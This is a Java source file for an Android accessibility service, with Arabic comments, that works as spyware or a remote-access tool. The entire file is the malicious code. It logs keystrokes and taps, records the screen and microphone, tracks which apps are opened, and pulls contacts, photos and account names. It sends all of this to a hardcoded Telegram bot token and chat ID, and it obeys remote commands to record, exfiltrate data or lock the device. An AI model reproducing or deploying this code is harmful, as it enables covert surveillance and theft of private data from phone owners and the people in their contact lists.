package com.v8.global.sniffer;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class RecordingAccessibilityService extends AccessibilityService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    
    private MediaProjection mediaProjection;
    private MediaRecorder mediaRecorder;
    private VirtualDisplay virtualDisplay;
    private int screenWidth, screenHeight, screenDensity;
    private boolean isRecording = false;
    private String currentVideoPath;
    private MediaProjectionManager projectionManager;
    private OkHttpClient client = new OkHttpClient();
    private Handler handler = new Handler(Looper.getMainLooper());
    private String lastAppPackage = "";
    private StringBuilder typingBuffer = new StringBuilder();
    private boolean isTyping = false;

    @Override
    public void onCreate() {
        super.onCreate();
        
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        
        // إرسال تأكيد بدء الخدمة
        sendToTelegram("🚀 خدمة التسجيل بدأت", CHAT_ID);
        
        // إعدادات الخدمة
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
        
        // الحصول على مقاسات الشاشة
        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
        
        // استعادة صلاحية التسجيل
        setupMediaProjection();
        
        // بدء مراقبة التطبيقات
        startAppMonitoring();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            sendToTelegram("📥 أمر واصل للخدمة: " + action, CHAT_ID);
            
            switch (action) {
                case "START_RECORDING":
                    startScreenRecording();
                    break;
                case "STOP_RECORDING":
                    stopScreenRecording();
                    break;
                case "GET_CONTACTS":
                    new Thread(() -> extractAndSendContacts()).start();
                    break;
                case "GET_PHOTOS":
                    new Thread(() -> extractAndSendPhotos()).start();
                    break;
                case "LOCK_SCREEN":
                    lockScreen();
                    break;
                case "GET_ACCOUNTS":
                    new Thread(() -> extractAndSendAccounts()).start();
                    break;
                case "SCREEN_OFF":
                    turnScreenOff();
                    break;
            }
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void setupMediaProjection() {
        SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
        int resultCode = prefs.getInt("resultCode", -1);
        String dataUri = prefs.getString("data", null);
        
        if (resultCode != -1 && dataUri != null) {
            try {
                Intent data = Intent.parseUri(dataUri, 0);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                    sendToTelegram("✅ صلاحية التسجيل مستعادة", CHAT_ID);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            sendToTelegram("❌ لا توجد صلاحية تسجيل", CHAT_ID);
        }
    }

    private void startScreenRecording() {
        if (isRecording) {
            sendToTelegram("⚠️ التسجيل بالفعل شغال", CHAT_ID);
            return;
        }
        if (mediaProjection == null) {
            sendToTelegram("❌ لا توجد صلاحية تسجيل", CHAT_ID);
            setupMediaProjection();
            return;
        }
        
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File videosDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES);
            if (!videosDir.exists()) videosDir.mkdirs();
            
            currentVideoPath = videosDir.getAbsolutePath() + "/rec_" + timeStamp + ".mp4";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(currentVideoPath);
            mediaRecorder.setVideoSize(screenWidth, screenHeight);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024);
            mediaRecorder.setVideoFrameRate(30);
            
            mediaRecorder.prepare();
            
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenRecorder",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder.getSurface(), null, null
            );
            
            mediaRecorder.start();
            isRecording = true;
            
            sendToTelegram("🎥 بدأ تسجيل الشاشة", CHAT_ID);
            
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل بدء التسجيل: " + e.getMessage(), CHAT_ID);
        }
    }

    private void stopScreenRecording() {
        if (!isRecording) {
            sendToTelegram("⚠️ لا يوجد تسجيل شغال", CHAT_ID);
            return;
        }
        
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            virtualDisplay.release();
            isRecording = false;
            
            sendToTelegram("⏹ تم إيقاف التسجيل، جاري الإرسال", CHAT_ID);
            
            // إرسال الفيديو
            sendVideoToTelegram(currentVideoPath);
            
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل إيقاف التسجيل: " + e.getMessage(), CHAT_ID);
        }
    }

    private void extractAndSendContacts() {
        try {
            sendToTelegram("📇 جاري سحب جهات الاتصال...", CHAT_ID);
            
            JSONArray contactsArray = new JSONArray();
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            
            int count = 0;
            while (cursor != null && cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                
                JSONObject contact = new JSONObject();
                contact.put("name", name);
                contact.put("phone", phone);
                contactsArray.put(contact);
                count++;
            }
            if (cursor != null) cursor.close();
            
            if (count == 0) {
                sendToTelegram("📇 لا توجد جهات اتصال", CHAT_ID);
                return;
            }
            
            // حفظ في ملف
            File file = new File(getCacheDir(), "contacts.json");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(contactsArray.toString(2).getBytes());
            fos.close();
            
            sendToTelegram("📇 تم سحب " + count + " جهة اتصال، جاري الإرسال", CHAT_ID);
            
            // إرسال الملف
            sendFileToTelegram(file, "contacts.json");
            
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل سحب جهات الاتصال: " + e.getMessage(), CHAT_ID);
        }
    }

    private void extractAndSendPhotos() {
        try {
            sendToTelegram("🖼 جاري سحب الصور...", CHAT_ID);
            
            File photosDir = new File(getCacheDir(), "photos");
            if (!photosDir.exists()) photosDir.mkdirs();
            
            String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA};
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, null);
            
            List<File> photoFiles = new ArrayList<>();
            int count = 0;
            
            while (cursor != null && cursor.moveToNext() && count < 20) { // حد أقصى 20 صورة
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                File sourceFile = new File(path);
                if (sourceFile.exists()) {
                    File destFile = new File(photosDir, "photo_" + count + ".jpg");
                    copyFile(sourceFile, destFile);
                    photoFiles.add(destFile);
                    count++;
                }
            }
            if (cursor != null) cursor.close();
            
            if (count == 0) {
                sendToTelegram("🖼 لا توجد صور", CHAT_ID);
                return;
            }
            
            sendToTelegram("🖼 تم سحب " + count + " صورة، جاري الضغط والإرسال", CHAT_ID);
            
            // ضغط الملفات
            File zipFile = new File(getCacheDir(), "photos.zip");
            zipFiles(photoFiles, zipFile);
            
            // إرسال الملف
            sendFileToTelegram(zipFile, "photos.zip");
            
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل سحب الصور: " + e.getMessage(), CHAT_ID);
        }
    }

    private void extractAndSendAccounts() {
        try {
            sendToTelegram("👤 جاري سحب الحسابات...", CHAT_ID);
            
            JSONArray accountsArray = new JSONArray();
            AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
            Account[] accounts = accountManager.getAccounts();
            
            for (Account account : accounts) {
                JSONObject acc = new JSONObject();
                acc.put("type", account.type);
                acc.put("name", account.name);
                accountsArray.put(acc);
            }
            
            if (accountsArray.length() == 0) {
                sendToTelegram("👤 لا توجد حسابات", CHAT_ID);
                return;
            }
            
            // حفظ في ملف
            File file = new File(getCacheDir(), "accounts.json");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(accountsArray.toString(2).getBytes());
            fos.close();
            
            sendToTelegram("👤 تم سحب " + accountsArray.length() + " حساب، جاري الإرسال", CHAT_ID);
            
            // إرسال الملف
            sendFileToTelegram(file, "accounts.json");
            
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل سحب الحسابات: " + e.getMessage(), CHAT_ID);
        }
    }

    private void lockScreen() {
        try {
            sendToTelegram("🔒 جاري قفل الشاشة...", CHAT_ID);
            
            // محاولة قفل الشاشة عبر Device Admin
            DevicePolicyManager policyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
            
            if (policyManager.isAdminActive(adminReceiver)) {
                policyManager.lockNow();
                sendToTelegram("🔒 تم قفل الشاشة", CHAT_ID);
            } else {
                sendToTelegram("🔒 لا توجد صلاحية Admin", CHAT_ID);
            }
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل قفل الشاشة: " + e.getMessage(), CHAT_ID);
        }
    }

    private void turnScreenOff() {
        try {
            sendToTelegram("📱 جاري إطفاء الشاشة...", CHAT_ID);
            
            // إطفاء الشاشة
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 1);
                
                // محاولة إطفاء الشاشة عبر Device Admin
                DevicePolicyManager policyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
                
                if (policyManager.isAdminActive(adminReceiver)) {
                    policyManager.lockNow();
                }
            }
            
            sendToTelegram("📱 تم إطفاء الشاشة", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل إطفاء الشاشة: " + e.getMessage(), CHAT_ID);
        }
    }

    private void sendVideoToTelegram(String videoPath) {
        try {
            File file = new File(videoPath);
            if (!file.exists()) {
                sendToTelegram("❌ ملف الفيديو غير موجود", CHAT_ID);
                return;
            }
            
            String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "🎬 تسجيل شاشة - " + timeStamp)
                    .addFormDataPart("video", file.getName(),
                            RequestBody.create(MediaType.parse("video/mp4"), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendVideo")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(okhttp3.Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        sendToTelegram("✅ تم إرسال الفيديو بنجاح", CHAT_ID);
                    } else {
                        sendToTelegram("❌ فشل إرسال الفيديو: " + response.message(), CHAT_ID);
                    }
                    response.close();
                    file.delete();
                }

                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                    sendToTelegram("❌ فشل إرسال الفيديو: " + e.getMessage(), CHAT_ID);
                    e.printStackTrace();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل إرسال الفيديو: " + e.getMessage(), CHAT_ID);
        }
    }

    private void sendFileToTelegram(File file, String fileName) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "📁 " + fileName)
                    .addFormDataPart("document", fileName,
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(okhttp3.Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        sendToTelegram("✅ تم إرسال " + fileName + " بنجاح", CHAT_ID);
                    } else {
                        sendToTelegram("❌ فشل إرسال " + fileName + ": " + response.message(), CHAT_ID);
                    }
                    response.close();
                    file.delete();
                }

                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                    sendToTelegram("❌ فشل إرسال " + fileName + ": " + e.getMessage(), CHAT_ID);
                    e.printStackTrace();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
            sendToTelegram("❌ فشل إرسال الملف: " + e.getMessage(), CHAT_ID);
        }
    }

    private void sendToTelegram(String message, String chatId) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
        
        FormBody formBody = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", message)
                .build();
        
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(okhttp3.Call call, Response response) throws IOException {
                response.close();
            }

            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                e.printStackTrace();
            }
        });
    }

    private void copyFile(File src, File dst) throws IOException {
        FileInputStream in = new FileInputStream(src);
        FileOutputStream out = new FileOutputStream(dst);
        byte[] buf = new byte[1024];
        int len;
        while ((len = in.read(buf)) > 0) {
            out.write(buf, 0, len);
        }
        in.close();
        out.close();
    }

    private void zipFiles(List<File> files, File zipFile) throws IOException {
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        byte[] buffer = new byte[1024];
        
        for (File file : files) {
            FileInputStream fis = new FileInputStream(file);
            zos.putNextEntry(new ZipEntry(file.getName()));
            
            int length;
            while ((length = fis.read(buffer)) > 0) {
                zos.write(buffer, 0, length);
            }
            
            fis.close();
            zos.closeEntry();
        }
        zos.close();
    }

    private void startAppMonitoring() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkCurrentApp();
                handler.postDelayed(this, 2000);
            }
        }, 2000);
    }

    private void checkCurrentApp() {
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            List<ActivityManager.RunningAppProcessInfo> processes = activityManager.getRunningAppProcesses();
            if (processes != null && processes.size() > 0) {
                String packageName = processes.get(0).processName;
                if (!packageName.equals(lastAppPackage)) {
                    lastAppPackage = packageName;
                    
                    // الحصول على اسم التطبيق
                    String appName = packageName;
                    try {
                        PackageManager pm = getPackageManager();
                        appName = pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
                    } catch (Exception e) {}
                    
                    sendToTelegram("📱 فتح تطبيق: " + appName, CHAT_ID);
                }
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // مراقبة الكتابة
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && event.getText().size() > 0) {
                String text = event.getText().get(0).toString();
                if (text.length() > 0) {
                    typingBuffer.append(text);
                    isTyping = true;
                    
                    // بعد التوقف عن الكتابة لمدة ثانيتين
                    handler.removeCallbacks(typingTimeout);
                    handler.postDelayed(typingTimeout, 2000);
                }
            }
        }
        
        // مراقبة النقرات
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                sendToTelegram("👆 نقر على: " + source.getText(), CHAT_ID);
            }
        }
    }

    private Runnable typingTimeout = new Runnable() {
        @Override
        public void run() {
            if (typingBuffer.length() > 0) {
                sendToTelegram("✍️ كتابة: " + typingBuffer.toString(), CHAT_ID);
                typingBuffer = new StringBuilder();
                isTyping = false;
            }
        }
    };

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (isRecording) {
            stopScreenRecording();
        }
        
        if (mediaProjection != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mediaProjection.stop();
        }
    }
}
